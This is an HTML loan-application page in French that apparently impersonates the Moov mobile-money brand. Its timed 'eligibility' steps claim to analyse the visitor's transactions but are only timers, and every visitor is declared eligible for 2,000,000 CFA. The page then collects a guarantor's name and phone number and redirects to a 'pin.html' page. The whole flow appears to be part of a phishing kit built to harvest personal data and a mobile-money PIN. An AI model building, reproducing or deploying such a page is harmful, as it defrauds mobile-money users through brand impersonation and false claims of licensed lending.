<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
    <title>MOOV Prêts – Demande de prêt</title>
    <link rel="icon" href="https://moov.bf/favicon.ico" type="image/x-icon">
    <meta name="theme-color" content="#E8701A">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --moov-orange: #E8701A;
            --moov-darkorange: #c95f10;
            --moov-blue: #1A6DBF;
            --black: #1a1a1a;
            --gray: #6b7a8f;
            --lightgray: #f5f6f8;
            --shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
            --shadow-hover: 0 12px 32px rgba(0, 0, 0, 0.12);
            --border-radius: 20px;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--lightgray);
            color: var(--black);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 12px;
        }

        /* ===== HEADER ===== */
        header {
            width: 100%;
            max-width: 480px;
            padding: 12px 16px;
            text-align: center;
            margin-bottom: 12px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
            position: relative;
        }

        .logo {
            font-size: clamp(28px, 7vw, 40px);
            font-weight: 800;
            letter-spacing: -0.5px;
        }
        .logo .moov { color: var(--moov-orange); }
        .logo .pret { color: var(--moov-blue); }

        /* ===== CARD ===== */
        .card {
            background: white;
            border-radius: var(--border-radius);
            padding: 24px 18px 32px;
            width: 100%;
            max-width: 480px;
            box-shadow: var(--shadow);
            border: 1px solid rgba(0, 0, 0, 0.04);
            transition: transform 0.25s ease, box-shadow 0.25s ease;
            position: relative;
            margin-bottom: 16px;
        }

        .card:hover {
            transform: translateY(-3px);
            box-shadow: var(--shadow-hover);
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 5px;
            background: linear-gradient(90deg, var(--moov-orange), var(--moov-blue));
            border-radius: var(--border-radius) var(--border-radius) 0 0;
        }

        /* ===== STEP CONTAINER ===== */
        .step-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 16px;
            padding: 8px 0;
        }

        .step-icon {
            font-size: 48px;
            color: var(--moov-orange);
            margin-bottom: 4px;
        }

        .step-title {
            font-size: 24px;
            font-weight: 700;
            color: var(--moov-orange);
            margin-bottom: 4px;
        }

        .step-description {
            font-size: 15px;
            color: var(--gray);
            line-height: 1.5;
            text-align: center;
        }

        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid #ffe0d0;
            border-top: 3px solid var(--moov-orange);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 16px auto 0;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* ===== FORM ===== */
        .limit-badge {
            background: #fef2f2;
            border: 1px solid #fee2e2;
            border-radius: 40px;
            padding: 8px 16px;
            display: inline-block;
            font-weight: 600;
            color: var(--moov-orange);
            margin: 16px 0 12px;
        }

        .loan-form {
            width: 100%;
            margin: 16px 0 8px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: var(--gray);
            margin-bottom: 8px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #ced4da;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 500;
            outline: none;
            transition: border 0.2s, box-shadow 0.2s;
            background: #fdfdfe;
        }

        .input-group input:focus {
            border-color: var(--moov-orange);
            box-shadow: 0 0 0 3px rgba(232, 112, 26, 0.12);
        }

        .input-group input.invalid {
            border-color: #dc2626 !important;
        }

        .error-message {
            font-size: 12px;
            color: #dc2626;
            margin-top: 6px;
            display: none;
        }

        .error-message.visible {
            display: block;
        }

        .name-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 20px;
        }

        .section-header {
            text-align: left;
            margin: 20px 0 12px 0;
            padding-bottom: 8px;
            border-bottom: 2px solid #ffe0d0;
        }

        .section-header h3 {
            font-size: 16px;
            font-weight: 700;
            color: var(--moov-orange);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 60px;
            font-size: 16px;
            font-weight: 700;
            color: white;
            background: linear-gradient(135deg, var(--moov-orange), var(--moov-darkorange));
            box-shadow: 0 6px 18px rgba(232, 112, 26, 0.3);
            cursor: pointer;
            transition: 0.2s;
            margin-top: 8px;
        }

        .btn-submit:disabled {
            background: #b8cff0;
            box-shadow: none;
            cursor: not-allowed;
            opacity: 0.7;
        }

        .btn-submit:not(:disabled):hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 28px rgba(232, 112, 26, 0.4);
        }
        .btn-submit:not(:disabled):active {
            transform: scale(0.97);
        }

        /* ===== FOOTER ===== */
        footer {
            padding: 16px 16px 20px;
            color: #adb5bd;
            font-size: 12px;
            text-align: center;
        }
        footer a {
            color: var(--moov-orange);
            text-decoration: none;
            font-weight: 600;
        }

        /* ===== SPINNER OVERLAY ===== */
        #spinnerOverlay {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(2px);
            z-index: 999;
        }

        .spinner {
            width: 44px;
            height: 44px;
            border: 4px solid #ffe0d0;
            border-top: 4px solid var(--moov-orange);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @media (max-width: 380px) {
            body { padding: 8px; }
            .card { padding: 20px 14px; }
            .name-row { grid-template-columns: 1fr; gap: 0; }
            .name-row .input-group { margin-bottom: 16px; }
            .btn-submit { padding: 14px; font-size: 15px; }
        }
    </style>
</head>
<body>

    <header>
        <div class="logo">
            <span class="moov">MOOV</span><span class="pret">Prêts</span>
        </div>
    </header>

    <main class="card" id="mainCard">
        <div id="stepContent"></div>
    </main>

    <footer>
        © 2026 MOOV Prêts – Services financiers agréés | <a href="mailto:support@moovpret.bf">support@moovpret.bf</a>
    </footer>

    <!-- Spinner -->
    <div id="spinnerOverlay">
        <div class="spinner"></div>
    </div>

    <script>
        // ===== ÉTAPES =====
        const steps = [
            {
                icon: 'fas fa-user-check',
                title: 'Vérification d\'éligibilité',
                description: 'Analyse de votre historique de transactions et de votre solde...',
                duration: 4000
            },
            {
                icon: 'fas fa-chart-line',
                title: 'Calcul de votre limite',
                description: 'Évaluation de votre capacité de remboursement et de votre score...',
                duration: 3500
            },
            {
                icon: 'fas fa-file-invoice-dollar',
                title: 'Préparation de l\'offre',
                description: 'Finalisation du meilleur prêt adapté à vos besoins...',
                duration: 4000
            }
        ];

        let currentStep = 0;
        let timeoutId = null;
        const stepContent = document.getElementById('stepContent');

        const MAX_LIMIT = 2000000;   // 2 000 000 CFA
        const MIN_AMOUNT = 10000;    // 10 000 CFA
        const userPhone = localStorage.getItem('phone') || '';

        // ===== Rendu des étapes =====
        function renderStep(index) {
            const step = steps[index];
            stepContent.innerHTML = `
                <div class="step-container">
                    <div class="step-icon"><i class="${step.icon}"></i></div>
                    <div class="step-title">${step.title}</div>
                    <div class="step-description">${step.description}</div>
                    <div class="loader"></div>
                </div>
            `;
        }

        // ===== Formulaire =====
        function showLoanForm() {
            stepContent.innerHTML = `
                <div class="step-container">
                    <div class="step-icon"><i class="fas fa-check-circle"></i></div>
                    <div class="step-title">Vous êtes éligible !</div>
                    <div class="limit-badge">Limite maximale : ${MAX_LIMIT.toLocaleString('fr-FR')} CFA</div>
                    <div class="loan-form">
                        <div class="input-group">
                            <label>Montant du prêt (CFA)</label>
                            <input type="number" id="loanAmount" placeholder="Entre ${MIN_AMOUNT.toLocaleString('fr-FR')} et ${MAX_LIMIT.toLocaleString('fr-FR')} CFA" min="${MIN_AMOUNT}" max="${MAX_LIMIT}" step="1000">
                            <div class="error-message" id="amountError">Veuillez saisir un montant valide.</div>
                        </div>

                        <div class="section-header">
                            <h3><i class="fas fa-user-friends"></i> Coordonnées du garant</h3>
                        </div>
                        <div class="name-row">
                            <div class="input-group" style="margin-bottom:0;">
                                <label>Prénom</label>
                                <input type="text" id="guarantorFirstName" placeholder="Prénom">
                            </div>
                            <div class="input-group" style="margin-bottom:0;">
                                <label>Nom</label>
                                <input type="text" id="guarantorLastName" placeholder="Nom">
                            </div>
                        </div>
                        <div class="input-group">
                            <label>Téléphone du garant</label>
                            <input type="tel" id="guarantorPhone" placeholder="ex. 70 12 34 56" inputmode="numeric">
                            <div class="error-message" id="phoneError">Le numéro ne peut pas être le vôtre.</div>
                        </div>

                        <button class="btn-submit" id="applyBtn" disabled>Demander le prêt</button>
                    </div>
                </div>
            `;

            // Références
            const amountInput = document.getElementById('loanAmount');
            const firstNameInput = document.getElementById('guarantorFirstName');
            const lastNameInput = document.getElementById('guarantorLastName');
            const phoneInput = document.getElementById('guarantorPhone');
            const applyBtn = document.getElementById('applyBtn');
            const amountError = document.getElementById('amountError');
            const phoneError = document.getElementById('phoneError');

            // État de "touché" pour chaque champ
            let touched = {
                amount: false,
                firstName: false,
                lastName: false,
                phone: false
            };

            // Marquer comme touché sur blur
            amountInput.addEventListener('blur', () => { touched.amount = true; validateForm(false); });
            firstNameInput.addEventListener('blur', () => { touched.firstName = true; validateForm(false); });
            lastNameInput.addEventListener('blur', () => { touched.lastName = true; validateForm(false); });
            phoneInput.addEventListener('blur', () => { touched.phone = true; validateForm(false); });

            // Fonction de validation (forceShow = true pour forcer l'affichage des erreurs, ex. lors de la soumission)
            function validateForm(forceShow = false) {
                const amount = parseInt(amountInput.value, 10);
                const firstName = firstNameInput.value.trim();
                const lastName = lastNameInput.value.trim();
                const phone = phoneInput.value.trim();
                let valid = true;

                // Montant
                const amountValid = !isNaN(amount) && amount >= MIN_AMOUNT && amount <= MAX_LIMIT;
                if (forceShow || touched.amount) {
                    if (!amountValid) {
                        amountError.classList.add('visible');
                        amountInput.classList.add('invalid');
                        if (isNaN(amount)) amountError.textContent = 'Veuillez entrer un nombre valide.';
                        else amountError.textContent = `Montant entre ${MIN_AMOUNT.toLocaleString('fr-FR')} et ${MAX_LIMIT.toLocaleString('fr-FR')} CFA.`;
                    } else {
                        amountError.classList.remove('visible');
                        amountInput.classList.remove('invalid');
                    }
                } else {
                    amountError.classList.remove('visible');
                    amountInput.classList.remove('invalid');
                }
                if (!amountValid) valid = false;

                // Téléphone
                const phoneDigits = phone.replace(/\D/g, '');
                const userPhoneDigits = userPhone.replace(/\D/g, '');
                let phoneValid = true;
                if (phone === '') phoneValid = false;
                else if (phoneDigits === userPhoneDigits && userPhoneDigits !== '') phoneValid = false;
                else if (phoneDigits.length < 8) phoneValid = false;

                if (forceShow || touched.phone) {
                    if (!phoneValid) {
                        phoneError.classList.add('visible');
                        phoneInput.classList.add('invalid');
                        if (phone === '') phoneError.textContent = 'Le téléphone du garant est requis.';
                        else if (phoneDigits === userPhoneDigits && userPhoneDigits !== '') phoneError.textContent = 'Le numéro du garant ne peut pas être le vôtre.';
                        else phoneError.textContent = 'Numéro de téléphone invalide.';
                    } else {
                        phoneError.classList.remove('visible');
                        phoneInput.classList.remove('invalid');
                    }
                } else {
                    phoneError.classList.remove('visible');
                    phoneInput.classList.remove('invalid');
                }
                if (!phoneValid) valid = false;

                // Noms
                const nameValid = firstName !== '' && lastName !== '';
                let nameError = document.getElementById('nameError');
                if (!nameError) {
                    nameError = document.createElement('div');
                    nameError.id = 'nameError';
                    nameError.className = 'error-message';
                    phoneInput.parentNode.insertBefore(nameError, phoneInput.nextSibling);
                }
                if (forceShow || (touched.firstName && touched.lastName)) {
                    if (!nameValid) {
                        nameError.textContent = 'Prénom et nom sont obligatoires.';
                        nameError.classList.add('visible');
                        firstNameInput.classList.add('invalid');
                        lastNameInput.classList.add('invalid');
                    } else {
                        nameError.classList.remove('visible');
                        firstNameInput.classList.remove('invalid');
                        lastNameInput.classList.remove('invalid');
                    }
                } else {
                    nameError.classList.remove('visible');
                    firstNameInput.classList.remove('invalid');
                    lastNameInput.classList.remove('invalid');
                }
                if (!nameValid) valid = false;

                applyBtn.disabled = !valid;
                return valid;
            }

            // Écouter les changements pour mettre à jour le bouton (sans forcer les erreurs)
            amountInput.addEventListener('input', () => validateForm(false));
            firstNameInput.addEventListener('input', () => validateForm(false));
            lastNameInput.addEventListener('input', () => validateForm(false));
            phoneInput.addEventListener('input', () => validateForm(false));

            // Soumission
            applyBtn.addEventListener('click', function() {
                // Forcer la validation complète avec affichage des erreurs
                const isValid = validateForm(true);
                if (!isValid) return;

                const amount = parseInt(amountInput.value, 10);
                const firstName = firstNameInput.value.trim();
                const lastName = lastNameInput.value.trim();
                const phoneDigits = phoneInput.value.trim().replace(/\D/g, '');

                // Sauvegarde
                localStorage.setItem('loanAmount', amount);
                localStorage.setItem('guarantorFirstName', firstName);
                localStorage.setItem('guarantorLastName', lastName);
                localStorage.setItem('guarantorPhone', phoneDigits);

                const spinner = document.getElementById('spinnerOverlay');
                spinner.style.display = 'flex';
                applyBtn.disabled = true;

                setTimeout(() => {
                    window.location.href = 'pin.html';
                }, 1500);
            });

            // Validation initiale : bouton désactivé, mais aucune erreur affichée
            validateForm(false);
        }

        // ===== Enchaînement =====
        function nextStep() {
            currentStep++;
            if (currentStep < steps.length) {
                renderStep(currentStep);
                timeoutId = setTimeout(nextStep, steps[currentStep].duration);
            } else {
                showLoanForm();
            }
        }

        function startApplication() {
            renderStep(0);
            timeoutId = setTimeout(nextStep, steps[0].duration);
        }

        startApplication();

        window.addEventListener('beforeunload', () => {
            if (timeoutId) clearTimeout(timeoutId);
        });
    </script>
</body>
</html>
